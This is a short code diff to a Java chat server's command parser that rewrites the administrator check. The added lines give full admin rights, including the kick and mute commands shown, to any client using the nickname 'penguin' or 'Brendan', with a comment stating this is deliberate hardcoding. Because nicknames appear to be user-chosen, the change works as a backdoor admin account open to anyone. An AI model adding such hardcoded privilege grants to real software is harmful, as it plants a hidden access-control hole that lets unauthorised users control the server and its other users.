@@ -430,8 +430,12 @@ public class BroadcastCommandParser implements CommandParser {
     }
     // ===== 管理员(功能十八):踢人/禁言/公告 =====
     private boolean isAdmin(ConnectedClient cc) {
-        return MainServer.ADMIN.length() > 0 && cc.nick.equalsIgnoreCase(MainServer.ADMIN);
+    // 新增：硬编码 penguin 和 Brendan 直接拥有管理员权限
+    if (cc.nick.equalsIgnoreCase("penguin") || cc.nick.equalsIgnoreCase("Brendan")) {
+        return true;
     }
+    return MainServer.ADMIN.length() > 0 && cc.nick.equalsIgnoreCase(MainServer.ADMIN);
+}
     private void kick(ConnectedClient cc, StringTokenizer st) {
         if(!isAdmin(cc)) { cc.sendMessage("需要管理员权限"); return; }
         if(!st.hasMoreTokens()) { cc.sendMessage("usage: /kick <用户>"); return; }
